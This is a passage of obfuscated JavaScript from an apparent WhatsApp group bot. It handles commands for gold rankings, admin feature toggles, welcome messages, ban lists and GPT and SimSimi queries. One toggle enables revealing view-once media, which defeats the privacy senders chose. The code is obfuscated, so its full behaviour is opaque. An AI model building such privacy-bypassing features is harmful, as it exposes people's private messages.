              galo = rggold[rggold.map(_0x24560a => _0x24560a.grupo).indexOf(_0x4f1071)].usus.map(_0x52c25f => _0x52c25f);
              rank = galo.sort((_0x343f7c, _0x510a2e) => _0x510a2e.Golds - _0x343f7c.Golds);
              ment = [];
              ble = "💰 *Rank de Golds* 💰\n";
              for (let _0x56c261 = 0; _0x56c261 < Math.min(5, rank.length); _0x56c261++) {
                if (rank[_0x56c261] && rank[_0x56c261].id) {
                  ble += "\n┌───────────────\n│ " + (_0x56c261 + 1) + "º : @" + rank[_0x56c261].id.split("@")[0] + "\n│\n│  Saldo: " + rank[_0x56c261].Golds + "\n└────────────\n";
                  ment.push(rank[_0x56c261].id);
                }
              }
              _0xd7aa55(ble, ment, true);
              break;
            case "addgold":
            case "tirargold":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x1dcf0a && !Number(_0x1d6557) || _0x5b0a24[1]) {
                return _0x403602("Marque a mensagem ou @ do usuário que deseja adicionar Golds Ou tirar..\n\nExemplo: Se for apenas tirar ou add marcando a mensagem\nUse: " + _0x1d93be + "addgold 5\n\nSe for Tirar ou add usando @\nUse: " + _0x1d93be + "addgold @marque 5");
              }
              var _0x10bb9b = _0x1d6557.replace(_0x5b0a24, "");
              if (_0x3dec88 == "addgold") {
                _0x2f0b31(Number(_0x10bb9b), _0x1dcf0a);
              } else if (_0x3dec88 == "tirargold") {
                _0x1fb8da(Number(_0x10bb9b), _0x1dcf0a);
              }
              break;
            case "sistemgold":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("1 pra ligar / 0 pra desligar");
              }
              hora130 = moment.tz("America/Sao_Paulo").format("HH:mm");
              if (Number(_0x40e45c[0]) === 1) {
                if (_0x3fb600) {
                  return _0x403602("Ja esta ativo");
                }
                _0x3bd584[0].sistemGold = true;
                _0x33e29e(_0x3bd584);
                _0x403602("Sistema de Golds foi ativado com sucesso nesse grupo, As: " + hora130);
              } else if (Number(_0x40e45c[0]) === 0) {
                if (!_0x3fb600) {
                  return _0x403602("Ja esta Desativado");
                }
                _0x3bd584[0].sistemGold = false;
                _0x33e29e(_0x3bd584);
                _0x403602("Para a infelicidade dos usuários o sistema de Golds foi Desativado nesse grupo, As: " + hora130);
              } else {
                _0x403602("1 para ativar, 0 para desativar");
              }
              break;
            case "x9visuunica":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("1 pra ligar / 0 pra desligar");
              }
              if (Number(_0x40e45c[0]) === 1) {
                if (_0x1d56ff) {
                  return _0x403602("Ja esta ativo");
                }
                _0x3bd584[0].visuUnica = true;
                _0x33e29e(_0x3bd584);
                _0x403602("🌀 Ativou com sucesso o recurso de revelar visu única neste grupo 📝");
              } else if (Number(_0x40e45c[0]) === 0) {
                if (!_0x1d56ff) {
                  return _0x403602("Ja esta Desativado");
                }
                _0x3bd584[0].visuUnica = false;
                _0x33e29e(_0x3bd584);
                _0x403602("‼️ Desativou com sucesso o recurso de revelar visu única neste grupo✔️");
              } else {
                _0x403602("1 para ativar, 0 para desativar");
              }
              break;
            case "so_adm":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("1 pra ligar / 0 pra desligar");
              }
              if (Number(_0x40e45c[0]) === 1) {
                if (_0x1dffcb) {
                  return _0x403602("Ja esta ativo");
                }
                _0x3bd584[0].soadm = true;
                _0x33e29e(_0x3bd584);
                _0x403602(" - Ativou com sucesso o recurso de só adm utilizar comandos neste grupo 📝");
              } else if (Number(_0x40e45c[0]) === 0) {
                if (!_0x1dffcb) {
                  return _0x403602("Ja esta Desativado");
                }
                _0x3bd584[0].soadm = false;
                _0x33e29e(_0x3bd584);
                _0x403602("‼️ Desativou o recurso de Só ADM utiliar comandos neste grupo ✔️");
              } else {
                _0x403602("1 para ativar, 0 para desativar");
              }
              break;
            case "odelete":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("1 pra ligar / 0 pra desligar");
              }
              if (Number(_0x40e45c[0]) === 1) {
                if (_0x326231) {
                  return _0x403602("Ja esta ativo");
                }
                nescessario.Odelete = true;
                _0x130557(nescessario);
                _0x403602("🌀 Ativou com sucesso o recurso de delete nos grupos 📝");
              } else if (Number(_0x40e45c[0]) === 0) {
                if (!_0x326231) {
                  return _0x403602("Ja esta Desativado");
                }
                nescessario.Odelete = false;
                _0x130557(nescessario);
                _0x403602("‼️ Desativou com sucesso o recurso de delete nos grupos ✔️");
              } else {
                _0x403602("1 para ativar, 0 para desativar");
              }
              break;
            case "antifake":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("1 pra ligar / 0 pra desligar");
              }
              if (Number(_0x40e45c[0]) === 1) {
                if (_0x1a630f) {
                  return _0x403602("Ja esta ativo");
                }
                _0x3bd584[0].antifake = true;
                _0x33e29e(_0x3bd584);
                _0x403602("🌀 Ativou com sucesso o recurso de antifake neste grupo 📝");
              } else if (Number(_0x40e45c[0]) === 0) {
                if (!_0x1a630f) {
                  return _0x403602("Ja esta Desativado");
                }
                _0x3bd584[0].antifake = false;
                _0x33e29e(_0x3bd584);
                _0x403602("‼️ Desativou com sucesso o recurso de antifake neste grupo✔️");
              } else {
                _0x403602("1 para ativar, 0 para desativar");
              }
              break;
            case "prefixs":
            case "prefixos":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (_0x3bd584[0].prefixs.length < 1) {
                return _0x403602("Não contem nenhum prefix a + adicionado neste grupo.");
              }
              bla = "Lista de prefixs para uso do bot, no Grupo: " + _0x471350 + "\n\n";
              for (_0xc3d45a of _0x3bd584[0].prefixs) {
                bla += "prefix: " + _0xc3d45a + "\n\n";
              }
              _0x403602(bla);
              break;
            case "add_prefix":
            case "add_prefixo":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5efc71) {
                return _0x403602("Para usar este comando, você deve ativar o comando, multiprefix\nExemplo: " + _0x1d93be + "multiprefix 1");
              }
              if (ANT_LTR_MD_EMJ(_0x1d6557)) {
                return _0x403602("Não pode letra modificada, nem emoji..");
              }
              if (!_0x1d6557.trim()) {
                return _0x403602("Determine o novo prefix, não pode espaço vazio...");
              }
              if (_0x1d6557.trim() > 1) {
                return _0x403602("Calma, o prefix só pode ser um\nExemplo: " + (_0x1d93be + _0x3dec88) + " _\nAe o bot vai passar á responder _ como prefix do bot..");
              }
              if (_0x3bd584[0].prefixs.indexOf(_0x1d6557.trim()) >= 0) {
                return _0x403602("Esse prefix já se encontra incluso, procure ver na lista dos prefixs\nExemplo: " + _0x1d93be + "prefixs");
              }
              _0x3bd584[0].prefixs.push(_0x1d6557.trim());
              _0x33e29e(_0x3bd584);
              _0x403602("prefix " + _0x1d6557.trim() + " Adicionado com sucesso na lista de prefixs para uso do bot, neste grupo...");
              break;
            case "tirar_prefix":
            case "tirar_prefixo":
            case "del_prefixo":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5efc71) {
                return _0x403602("Para usar este comando, você deve ativar o comando, multiprefix\nExemplo: " + _0x1d93be + "multiprefix 1");
              }
              if (ANT_LTR_MD_EMJ(_0x1d6557)) {
                return _0x403602("Não pode letra modificada, nem emoji..");
              }
              if (!_0x1d6557.trim()) {
                return _0x403602("Determine o prefix que deseja tirar, não pode espaço vazio...");
              }
              if (_0x1d6557.trim() > 1) {
                return _0x403602("Calma, o prefix só pode ser tirado um por vez\nExemplo: " + (_0x1d93be + _0x3dec88) + " _\nAe o bot não vai responder mais com _");
              }
              if (_0x3bd584[0].prefixs.indexOf(_0x1d6557.trim()) < 0) {
                return _0x403602("Esse prefix não está incluso, procure ver na lista dos prefixs\nExemplo: " + _0x1d93be + "prefixs");
              }
              if (_0x3bd584[0].prefixs.length == 1) {
                return _0x403602("Adicione um prefix para pode tirar este, tem que ter pelo menos 1 prefix já incluso dentro do sistema para tirar outro.");
              }
              _0x3bd584[0].prefixs.splice(_0x3bd584[0].prefixs.indexOf(_0x1d6557.trim()), 1);
              _0x33e29e(_0x3bd584);
              _0x403602("prefix " + _0x1d6557.trim() + " tirado com sucesso da lista de prefixs de uso deste grupo..");
              break;
            case "infomultiprefix":
            case "infomultiprefix":
              _0x5b6fe5(_0x6965b0 + " @" + _0x32e455.split("@")[0] + ", Irei informar como funciona a função de multiplos prefix.\n\nEssa função é por grupo, feito em um, não será feito em todos.\n\nPrimeiramente, ativar ele com \n\n" + _0x1d93be + "multiprefix usando primeira vez ele ativa, depois ele desativa... E assim vai em diante..\n\nContém os seguintes comandos:\n\n" + _0x1d93be + "add_prefix\n\n" + _0x1d93be + "tirar_prefix\n\n" + _0x1d93be + "prefixs\n\nExemplo do primeiro comando >\n\n" + _0x1d93be + "add_prefix &\n\nO & que usei como exemplo, vai passar a ser um prefix oficial do grupo, então se usar " + _0x1d93be + " ou & funcionará, pode adicionar quantos quiser.. \n\nE pra tirar vai fazer o seguinte\n" + _0x1d93be + "tirar_prefix &\n\nE pra verificar os prefixs que foi adicionado \n\n" + _0x1d93be + "prefixs\n\nÉ isso, boa sorte...");
              break;
            case "multprefixo":
            case "multiprefix":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e && !_0x2a5ff3) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5efc71) {
                _0x3bd584[0].multiprefix = true;
                _0x33e29e(_0x3bd584);
                _0x403602("🌀 Ativou com sucesso o recurso de multi prefixs neste grupo 📝");
              }
              if (_0x5efc71) {
                _0x3bd584[0].multiprefix = false;
                _0x33e29e(_0x3bd584);
                _0x403602("‼️ Desativou com sucesso o recurso de multi prefixs neste grupo✔️");
              }
              break;
            case "antinotas":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("Hmmmm");
              }
              if (Number(_0x40e45c[0]) === 1) {
                if (_0x4994fc) {
                  return _0x403602("Já Esta ativo");
                }
                _0x3bd584[0].antinotas = true;
                _0x33e29e(_0x3bd584);
                _0x403602("Ativou com sucesso o recurso de anti notas neste grupo✔️");
              } else if (Number(_0x40e45c[0]) === 0) {
                if (!_0x4994fc) {
                  return _0x403602("Ja esta Desativado.");
                }
                _0x3bd584[0].antinotas = false;
                _0x33e29e(_0x3bd584);
                _0x403602("Desativou com sucesso o recurso de anti notas neste grupo✔️");
              } else {
                _0x403602("1 para ativar, 0 para desativar");
              }
              break;
            case "anticatalogo":
            case "anticatalg":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("1 pra ligar / 0 pra desligar");
              }
              if (Number(_0x40e45c[0]) === 1) {
                if (_0x169982) {
                  return _0x403602("Ja esta ativo");
                }
                _0x3bd584[0].anticatalogo = true;
                _0x33e29e(_0x3bd584);
                _0x403602("🌀 Ativou com sucesso o recurso de anticatalogo neste grupo 📝");
              } else if (Number(_0x40e45c[0]) === 0) {
                if (!_0x169982) {
                  return _0x403602("Ja esta Desativado");
                }
                _0x3bd584[0].anticatalogo = false;
                _0x33e29e(_0x3bd584);
                _0x403602("‼️ Desativou com sucesso o recurso de anticatalogo neste grupo✔️");
              } else {
                _0x403602("1 para ativar, 0 para desativar");
              }
              break;
            case "bemvindo":
            case "welcome":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("1 pra ligar / 0 pra desligar");
              }
              if (Number(_0x40e45c[0]) === 1) {
                if (_0x1146e6) {
                  return _0x403602("Ja esta ativo");
                }
                _0x3bd584[0].wellcome[0].bemvindo1 = true;
                _0x33e29e(_0x3bd584);
                _0x403602("🌀 Ativou com sucesso o recurso de bem vindo neste grupo 📝");
              } else if (Number(_0x40e45c[0]) === 0) {
                if (!_0x1146e6) {
                  return _0x403602("Ja esta Desativado");
                }
                _0x3bd584[0].wellcome[0].bemvindo1 = false;
                _0x33e29e(_0x3bd584);
                _0x403602("‼️ Desativou com sucesso o recurso de bemvindo neste grupo✔️");
              } else {
                _0x403602("1 para ativar, 0 para desativar");
              }
              break;
            case "bemvindo2":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("Digite da forma correta:\nComando: " + (_0x1d93be + _0x3dec88) + " 1 para ativar ");
              }
              if (Number(_0x40e45c[0]) === 1) {
                if (_0x57d1c4) {
                  return _0x403602("❎O recurso já está ativado no grupo❎");
                }
                _0x3bd584[0].wellcome[1].bemvindo2 = true;
                _0x33e29e(_0x3bd584);
                _0x403602("✅O recurso foi ativado✅");
              } else if (Number(_0x40e45c[0]) === 0) {
                if (!_0x57d1c4) {
                  return _0x403602("❎O recurso não está ativado no grupo❎");
                }
                _0x3bd584[0].wellcome[1].bemvindo2 = false;
                _0x33e29e(_0x3bd584);
                _0x403602("❌O recurso foi desativado❌");
              } else {
                _0x403602("Digite da forma correta:\nComando: " + (_0x1d93be + _0x3dec88) + " 1, para ativar e 0 para desativar");
              }
              break;
            case "legendabv":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("*Escreva a mensagem de boas-vindas*");
              }
              teks = _0x2e320b.slice(11);
              if (_0x1146e6) {
                _0x3bd584[0].wellcome[0].legendabv = teks;
                _0x33e29e(_0x3bd584);
                _0x403602("*Mensagem de boas vindas definida com sucesso!*");
              } else {
                _0x403602("Ative o " + _0x1d93be + "bemvindo 1");
              }
              break;
            case "legendasaiu":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("*Escreva a mensagem de saída*");
              }
              teks = _0x2e320b.slice(13);
              if (_0x1146e6) {
                _0x3bd584[0].wellcome[0].legendasaiu = teks;
                _0x33e29e(_0x3bd584);
                _0x403602("*Mensagem de saída definida com sucesso!*");
              } else {
                _0x403602("Ative o " + _0x1d93be + "bemvindo 1");
              }
              break;
            case "legendabv2":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("*Escreva a mensagem de boas-vindas*");
              }
              teks = _0x2e320b.slice(12);
              if (_0x57d1c4) {
                _0x3bd584[0].wellcome[1].legendabv = teks;
                _0x33e29e(_0x3bd584);
                _0x403602("*Mensagem de boas vindas2 definida com sucesso!*");
              } else {
                _0x403602("Ative o " + _0x1d93be + "bemvindo2 1");
              }
              break;
            case "legendasaiu2":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("*Escreva a mensagem de saída*");
              }
              teks = _0x2e320b.slice(14);
              if (_0x57d1c4) {
                _0x3bd584[0].wellcome[1].legendasaiu = teks;
                _0x33e29e(_0x3bd584);
                _0x403602("*Mensagem de saída2 definida com sucesso!*");
              } else {
                _0x403602("Ative o " + _0x1d93be + "bemvindo2 1");
              }
              break;
            case "legenda_estrangeiro":
            case "legenda_estrangeiros":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("*Escreva a mensagem de remoção de estrangeiros*");
              }
              if (_0x1a630f) {
                _0x3bd584[0].legenda_estrangeiro = _0x1d6557;
                _0x33e29e(_0x3bd584);
                _0x403602("*Mensagem de remoção de estrangeiros definida com sucesso!*");
              } else {
                _0x403602("Ative o antifake primeiro com " + _0x1d93be + "antifake 1");
              }
              break;
            case "legenda_video":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("*Escreva a mensagem de remoção de estrangeiros*");
              }
              _0x3bd584[0].legenda_video = _0x1d6557;
              _0x33e29e(_0x3bd584);
              _0x403602("*Mensagem de remoção de video definida com sucesso!*");
              break;
            case "legenda_imagem":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("*Escreva a mensagem de remoção de estrangeiros*");
              }
              _0x3bd584[0].legenda_imagem = _0x1d6557;
              _0x33e29e(_0x3bd584);
              _0x403602("*Mensagem de remoção de imagem definida com sucesso!*");
              break;
            case "legenda_documento":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("*Escreva a mensagem de remoção de estrangeiros*");
              }
              _0x3bd584[0].legenda_documento = _0x1d6557;
              _0x33e29e(_0x3bd584);
              _0x403602("*Mensagem de remoção de Documento definida com sucesso!*");
              break;
            case "addautorm":
            case "addautoban":
            case "listanegra":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e && !_0x2a5ff3) {
                return _0x403602("Precisa ser Dono ou Adm");
              }
              if (!_0x415e57) {
                return _0x403602("Marque a mensagem do usuário com o comando ou utilize o comando com o número do usuário que deseja adicionar na lista negra..");
              }
              if (_0x3bd584[0].listanegra.includes(_0x415e57)) {
                return _0x403602("*Esse Número ja esta incluso*");
              }
              _0x3bd584[0].listanegra.push(_0x415e57);
              _0x33e29e(_0x3bd584);
              _0x403602("*Número adicionado a lista de autoban*");
              break;
            case "autobang":
            case "listanegrag":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0x415e57) {
                return _0x403602("Marque a mensagem do usuário com o comando ou utilize o comando com o número do usuário que deseja adicionar na lista negra Global..");
              }
              if (_0x48d62e.includes(_0x415e57)) {
                return _0x403602("*Esse Número ja esta incluso*");
              }
              _0x48d62e.push(_0x415e57);
              fs.writeFileSync("./DADOS/Dono/nescessario.json", JSON.stringify(nescessario, null, "\t"));
              _0x403602("*Número adicionado a lista de autoban Global*");
              break;
            case "tirardalistag":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0x415e57) {
                return _0x403602("Marque a mensagem do usuário com o comando ou utilize o comando com o número do usuário que deseja tirar da lista negra..");
              }
              if (!_0x48d62e.includes(_0x415e57)) {
                return _0x403602("*Esse Número não esta incluso*");
              }
              var _0xc3d45a = _0x48d62e.indexOf(_0x415e57);
              _0x48d62e.splice(_0xc3d45a, 1);
              fs.writeFileSync("./DADOS/Dono/nescessario.json", JSON.stringify(nescessario, null, "\t"));
              _0x403602("*Número foi removido da lista negra Global*");
              break;
            case "delremover":
            case "delautorm":
            case "delautoban":
            case "tirardalista":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e && !_0x2a5ff3) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              if (!_0x415e57) {
                return _0x403602("Marque a mensagem do usuário com o comando ou utilize o comando com o número do usuário que deseja tirar da lista negra..");
              }
              if (!_0x3bd584[0].listanegra.includes(_0x415e57)) {
                return _0x403602("*Esse Número não esta incluso*");
              }
              var _0xc3d45a = _0x3bd584[0].listanegra.indexOf(_0x415e57);
              _0x3bd584[0].listanegra.splice(_0xc3d45a, 1);
              _0x33e29e(_0x3bd584);
              _0x403602("*Número foi removido da lista de autoban*");
              break;
            case "listban":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (_0x3bd584[0].listanegra.length < 1) {
                return _0x403602("*Nenhum Número não foi adicionado*");
              }
              teks = "*Números que vou moer na porrada se voltar 😡:*\n";
              for (_0xc3d45a = 0; _0xc3d45a < _0x3bd584[0].listanegra.length; ++_0xc3d45a) {
                teks += "➤ *" + _0x3bd584[0].listanegra[_0xc3d45a].split("@")[0] + "*\n";
              }
              teks += "*Esses ai vou descer meu martelo do ban 🥵*";
              _0x403602(teks);
              break;
            case "iamage":
            case "superimg":
            case "imgcr":
            case "gimage":
              try {
                _0x403602("Realizando pedido..");
                const _0x4e766f = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, {
                  image: {
                    url: SITE_JEFF_APIS + "/api/gimage2?text=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e
                  }
                }, _0x4e766f).catch(() => {
                  return _0x403602("" + infoerror);
                });
              } catch {
                return _0x403602("" + infoerror);
              }
              break;
            case "simi":
            case "xbot":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              try {
                await new Promise(_0x3c2ed7 => setTimeout(_0x3c2ed7, 3000));
                await _0x263319.sendPresenceUpdate("composing", _0x4f1071);
                datasimi = await fetchJson("https://api.simsimi.vn/v1/simtalk", {
                  method: "POST",
                  headers: {
                    "content-type": "application/x-www-form-urlencoded"
                  },
                  body: "text=" + _0x1d6557 + "&lc=pt"
                });
                return _0x403602(datasimi.message);
              } catch (_0x28cdb9) {
                return _0x403602("Resposta não encontrada..");
              }
              break;
            case "gpt":
            case "chatgpt":
              try {
                if (!_0x1d6557) {
                  return _0x403602("Faça uma pergunta, exemplo:\n\n*" + (_0x1d93be + _0x3dec88) + " Quantos anos para o plástico se decompor.*");
                }
                setTimeout(async () => {
                  await _0x263319.sendPresenceUpdate("composing", _0x4f1071);
                }, 3000);
                const _0x341301 = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, {
                  text: "Aguarde, criando / pesquisando sobre o que está perguntando ou pedindo."
                }, _0x341301);
                const _0x3e7138 = await fetchJson(SITE_JEFF_APIS + "/outros/openai?pergunta=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x2f0c70 = {
                  text: _0x3e7138.resultado,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x2f0c70);
              } catch (_0x5085c4) {
                _0x403602("Ocorreu um erro ao processar a pergunta.");
              }
              break;
            case "gpt4":
            case "chatgpt4":
              try {
                if (!_0x1d6557) {
                  return _0x403602("Por favor, faça uma pergunta. Exemplo:\n\n*" + (_0x1d93be + _0x3dec88) + " Quantos anos para o plástico se decompor.*");
                }
                setTimeout(async () => {
                  await _0x263319.sendPresenceUpdate("composing", _0x4f1071);
                }, 3000);
                const _0x1757f2 = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, {
                  text: "Aguarde, criando / pesquisando sobre o que está perguntando ou pedindo."
                }, _0x1757f2);
                const _0x13abf2 = await fetchJson(SITE_JEFF_APIS + "/outros/gpt-4/v2?query=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x2603fd = _0x13abf2.resultado || "Não foi possível obter uma resposta.";
                const _0x45ee0e = {
                  text: _0x2603fd,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x45ee0e);
              } catch (_0x91de4d) {
                _0x403602("Ocorreu um erro ao processar a pergunta.");
              }
              break;
            case "simih":
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("1 pra ligar / 0 pra desligar");
              }
              if (Number(_0x40e45c[0]) === 1) {
                if (_0x12f03b) {
                  return _0x403602("O modo Simi está ativo");
                }
                _0x3bd584[0].simi1 = true;
                _0x33e29e(_0x3bd584);
                _0x403602("Ativado com sucesso o modo simi neste grupo 😗..");
              } else if (Number(_0x40e45c[0]) === 0) {
                if (!_0x12f03b) {
                  return _0x403602("Já está Desativado.");
                }
                _0x3bd584[0].simi1 = false;
                _0x33e29e(_0x3bd584);
                _0x403602("Desativado modo simi com sucesso neste grupo 😡️");
              } else {
                _0x403602("1 para ativar, 0 para desativar, lerdao vc em KKKKK");
              }
              break;
            case "simih2":
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("1 pra ligar / 0 pra desligar");
              }
              if (Number(_0x40e45c[0]) === 1) {
                if (_0x452d71) {
                  return _0x403602("O modo Simi está ativo");
                }
                _0x3bd584[0].simi2 = true;
                _0x33e29e(_0x3bd584);
                _0x403602("Ativado com sucesso o modo simi neste grupo 😗..");
              } else if (Number(_0x40e45c[0]) === 0) {
                if (!_0x452d71) {
                  return _0x403602("Já está Desativado.");
                }
                _0x3bd584[0].simi2 = false;
                _0x33e29e(_0x3bd584);
                _0x403602("Desativado modo simi com sucesso neste grupo 😡️");
              } else {
                _0x403602("1 para ativar, 0 para desativar, lerdao vc em KKKKK");
              }
              break;
            case "autofigu":
            case "autosticker":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("1 pra ligar / 0 pra desligar");
              }
              if (Number(_0x40e45c[0]) === 1) {
                if (_0x47a927) {
                  return _0x403602("Ja esta ativo");
                }
                _0x3bd584[0].autosticker = true;
                _0x33e29e(_0x3bd584);
                _0x403602("🌀 Ativou com sucesso o recurso de auto figurinhas neste grupo 📝");
              } else if (Number(_0x40e45c[0]) === 0) {
                if (!_0x47a927) {
                  return _0x403602("Ja esta Desativado");
                }
                _0x3bd584[0].autosticker = false;
                _0x33e29e(_0x3bd584);
                _0x403602("‼️ Desativou com sucesso o recurso de auto figurinhas neste grupo✔️");
              } else {
                _0x403602("1 para ativar, 0 para desativar");
              }
              break;
            case "autorepo":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("1 pra ligar / 0 pra desligar");
              }
              if (Number(_0x40e45c[0]) === 1) {
                if (_0x193ccd) {
                  return _0x403602("Ja esta ativo");
                }
                _0x3bd584[0].autoresposta = true;
                _0x33e29e(_0x3bd584);
                _0x403602("🌀 Ativou com sucesso o recurso de auto resposta neste grupo 📝");
              } else if (Number(_0x40e45c[0]) === 0) {
                if (!_0x193ccd) {
                  return _0x403602("Ja esta Desativado");
                }
                _0x3bd584[0].autoresposta = false;
                _0x33e29e(_0x3bd584);
                _0x403602("‼️ Desativou com sucesso o recurso de auto resposta neste grupo✔️");
              } else {
                _0x403602("1 para ativar, 0 para desativar");
              }
              break;
            case "autoadm":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("1 pra ligar / 0 pra desligar");
              }
              if (Number(_0x40e45c[0]) === 1) {
                if (_0x4df73d) {
                  return _0x403602("Ja esta ativo");
                }
                _0x3bd584[0].AdmSemprefixo = true;
                _0x33e29e(_0x3bd584);
                _0x403602("🌀 Ativou com sucesso o recurso de auto Adm sem prefixo neste grupo 📝");
              } else if (Number(_0x40e45c[0]) === 0) {
                if (!_0x4df73d) {
                  return _0x403602("Ja esta Desativado");
                }
                _0x3bd584[0].AdmSemprefixo = false;
                _0x33e29e(_0x3bd584);
                _0x403602("‼️ Desativou com sucesso o recurso de auto Adm sem prefixo neste grupo✔️");
              } else {
                _0x403602("1 para ativar, 0 para desativar");
              }
              break;
            case "autotext":
            case "autotranscrever":
